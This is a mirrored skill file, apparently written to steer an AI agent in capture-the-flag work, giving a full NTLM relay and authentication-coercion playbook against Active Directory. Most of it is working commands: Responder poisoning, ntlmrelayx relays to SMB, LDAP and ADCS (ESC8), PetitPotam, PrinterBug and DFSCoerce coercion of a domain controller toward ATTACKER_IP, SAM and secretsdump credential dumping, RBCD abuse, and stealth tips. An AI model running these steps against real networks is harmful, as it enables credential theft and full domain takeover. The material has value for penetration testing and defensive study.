# NTLM Relay and Authentication Coercion

[Оглавление](https://raw.githubusercontent.com/BigBread57/zametki/main/INDEX.md) · [Происхождение и ограничения](https://raw.githubusercontent.com/BigBread57/zametki/main/SOURCES.md)

> Справочный документ. Инструкции и примеры ниже принадлежат источнику; они не подтверждают состояние вашей системы и не запускаются автоматически. Чтение этого файла не устанавливает скил, инструменты или MCP.

Источники этого текста:

- [Salman0x01/ctf-ai-agent-skills / instructions/active-directory/ntlm-relay-coerce.md](https://github.com/Salman0x01/ctf-ai-agent-skills/blob/0e91c90a7125c6591a56f51276275905f2dfb017/instructions/active-directory/ntlm-relay-coerce.md)

---

---
name: ntlm-relay-coerce
category: active-directory
triggers: ["ntlm relay", "ntlmrelayx", "responder", "PetitPotam", "coercer", "printerbug", "dfscoerce", "SMB signing", "RBCD", "ESC8", "relay to LDAP", "relay to ADCS", "CVE-2019-1040", "poisoning"]
tools: ["impacket-ntlmrelayx", "Responder", "PetitPotam", "coercer", "printerbug.py", "dfscoerce", "netexec/nxc", "mssqlrelayx"]
priority: high
description: Capture or coerce NTLM authentication and relay it to SMB, LDAP, or ADCS to gain code execution, RBCD, or a certificate for privilege escalation.
---
# NTLM Relay and Authentication Coercion

## Trigger context
NTLM authentication can be relayed to another service when message signing is not enforced. Combine passive capture (Responder poisoning LLMNR/NBT-NS/mDNS) or active coercion (PetitPotam/PrinterBug/DFSCoerce forcing a victim — often a DC — to authenticate to you) with `ntlmrelayx` to reach a target that trusts the relayed identity.

## Objective
Relay a coerced/captured NTLM auth to a valuable target:
- Relay to **SMB** (signing off) -> dump SAM / exec / SOCKS shell.
- Relay to **LDAP(S)** -> configure RBCD or add a computer -> takeover.
- Relay to **ADCS HTTP** (ESC8) -> obtain a certificate for the victim (usually a DC) -> full domain.

## Methodology (decision tree)
```
Is SMB signing REQUIRED on candidate targets?  (nxc smb --gen-relay-list)
├── NO on member hosts → relay to smb:// → SAM dump / -i shell / SOCKS
├── DC signing on, but LDAP channel binding OFF → relay to ldap:// → RBCD / add computer
└── ADCS Web Enrollment present (http, no EPA) → relay to http://CA/certsrv (ESC8) → cert → auth as DC
How do you get the auth to relay?
├── Passive: Responder poisons name resolution (wait for a mistyped share / broadcast)
└── Active: coerce a specific victim → PetitPotam / printerbug / dfscoerce → point it at ntlmrelayx
```

## Commands & payloads
```bash
# --- 0. Find relayable targets (SMB signing NOT required) ---
nxc smb 10.10.10.0/24 --gen-relay-list relay_targets.txt
nxc smb 10.10.10.0/24                      # read the "signing:False" column
nxc ldap DC_IP -M ldap-checker             # check LDAP signing / channel binding

# --- 1. Configure Responder to free ports 445/80 for ntlmrelayx ---
sed -i 's/SMB = On/SMB = Off/' /usr/share/responder/Responder.conf
sed -i 's/HTTP = On/HTTP = Off/' /usr/share/responder/Responder.conf
responder -I eth0 -dwv                       # passive poisoning (LLMNR/NBT-NS/mDNS)

# --- 2a. Relay to SMB: dump SAM / interactive / SOCKS ---
impacket-ntlmrelayx -tf relay_targets.txt -smb2support            # default: dump SAM+LSA
impacket-ntlmrelayx -t smb://10.10.10.20 -smb2support -i          # interactive SMB shell on :11000
impacket-ntlmrelayx -tf relay_targets.txt -smb2support -socks     # queue sessions, use with proxychains
impacket-ntlmrelayx -t smb://10.10.10.20 -smb2support -c 'powershell -enc <b64>'   # command exec

# --- 2b. Relay to LDAP: RBCD (needs a computer account you control) ---
impacket-ntlmrelayx -t ldap://DC_IP --delegate-access --no-dump --escalate-user ATTACKERPC$
impacket-ntlmrelayx -t ldap://DC_IP --add-computer ATTACK$ --no-dump   # create a machine account first

# --- 2c. Relay to ADCS Web Enrollment (ESC8) -> cert for the coerced victim ---
impacket-ntlmrelayx -t http://CA_HOST/certsrv/certfnsh.asp -smb2support \
    --adcs --template DomainController      # use 'Machine'/'User' template as appropriate

# --- 3. Coerce a victim (point its auth at YOUR relay IP) ---
# PetitPotam (MS-EFSRPC) — often works unauthenticated pre-patch
python3 PetitPotam.py -u jdoe -p 'Passw0rd!' -d corp.local ATTACKER_IP DC_IP
python3 PetitPotam.py ATTACKER_IP DC_IP     # anonymous attempt

# PrinterBug (MS-RPRN spooler)
python3 printerbug.py corp.local/jdoe:'Passw0rd!'@DC_IP ATTACKER_IP

# DFSCoerce (MS-DFSNM)
python3 dfscoerce.py -u jdoe -p 'Passw0rd!' -d corp.local ATTACKER_IP DC_IP

# Coercer (multi-protocol, tries many RPC methods)
coercer coerce -u jdoe -p 'Passw0rd!' -d corp.local -l ATTACKER_IP -t DC_IP

# --- CVE-2019-1040: strip MIC to enable cross-protocol relay ---
impacket-ntlmrelayx -t ldap://DC_IP --remove-mic --delegate-access --escalate-user ATTACK$ -smb2support
```

Windows equivalents / notes: `Inveigh` replaces Responder; `SpoolSample.exe` / `Petitpotam.exe` for coercion. Relaying itself is easiest from Linux/impacket.

## Branching logic
- Coerced DC + ADCS present -> **ESC8** is the cleanest path: relay to `certsrv`, get a DC cert, then `certipy auth -pfx dc.pfx` -> DCSync (see adcs-esc + dcsync-dump).
- No ADCS -> relay to LDAP for **RBCD**: give a computer you control delegation over the victim, then request a service ticket as any user (see pth-ptt-lateral S4U).
- Target is a workstation with signing off -> relay to SMB for SAM dump / shell.
- DRSUAPI note: you cannot relay to DCSync directly (DRSUAPI always signs) unless the target is Zerologon-vulnerable.

## Common pitfalls
- Free the ports: Responder's SMB/HTTP must be OFF or `ntlmrelayx` can't bind 445/80.
- You cannot relay auth back to the SAME host it came from (reflection is patched, MS08-068/CVE-2019-1384).
- LDAP relay for RBCD requires signing/channel-binding to be OFF on LDAP; modern DCs may enforce LDAPS channel binding.
- RBCD needs a controlled computer account (`--add-computer`) — blocked if `ms-DS-MachineAccountQuota = 0`; then use an existing owned machine.
- Coercion needs the victim to reach YOU on 445 — check firewall/routing.
- `-smb2support` is required against modern Windows or the SMB relay fails silently.

SOCKS workflow (queue relayed sessions, then reuse them):
```bash
impacket-ntlmrelayx -tf relay_targets.txt -smb2support -socks
# in the ntlmrelayx console: 'socks' lists active sessions
proxychains impacket-secretsdump corp.local/victim@10.10.10.20 -no-pass   # reuse via SOCKS
proxychains nxc smb 10.10.10.20 -u victim -p '' --sam
```

OPSEC / detection notes:
- Responder poisoning is broadcast-visible and easily detected by canary/name-resolution honeypots.
- Coercion generates auth from the victim (e.g. DC$) to your host — anomalous machine-account SMB egress.
- Prefer targeted coercion (one victim) over broad Responder poisoning when stealth matters.

## Proof / verification
- SMB relay success: ntlmrelayx prints `[*] Authenticating against smb://... SUCCEED` and dumps SAM hashes.
- LDAP/RBCD: `msDS-AllowedToActOnBehalfOfOtherIdentity` set on the victim (verify with `nxc ldap ... -M ...` or bloodyAD).
- ESC8: a `.pfx` written; then `certipy auth -pfx dc.pfx` returns an NT hash / TGT for the machine account.

## Cross-references
- [sa--instructions--active-directory--adcs-esc.md](https://raw.githubusercontent.com/BigBread57/zametki/main/06-active-directory/sa--instructions--active-directory--adcs-esc.md) — ESC8 relay-to-ADCS full chain.
- [sa--instructions--active-directory--dcsync-dump.md](https://raw.githubusercontent.com/BigBread57/zametki/main/06-active-directory/sa--instructions--active-directory--dcsync-dump.md) — cash out a DC certificate / RBCD into replication.
- [sa--instructions--active-directory--pth-ptt-lateral.md](https://raw.githubusercontent.com/BigBread57/zametki/main/06-active-directory/sa--instructions--active-directory--pth-ptt-lateral.md) — S4U / RBCD ticket abuse and using dumped hashes.
- [sa--instructions--active-directory--ad-enum-bloodhound.md](https://raw.githubusercontent.com/BigBread57/zametki/main/06-active-directory/sa--instructions--active-directory--ad-enum-bloodhound.md) — identify signing-off hosts and coercion targets.

## Credible sources
- https://www.thehacker.recipes/ad/movement/ntlm/relay
- https://en.hackndo.com/ntlm-relay/
- https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/printers-spooler-service-abuse.html
- https://github.com/topotam/PetitPotam
- https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py
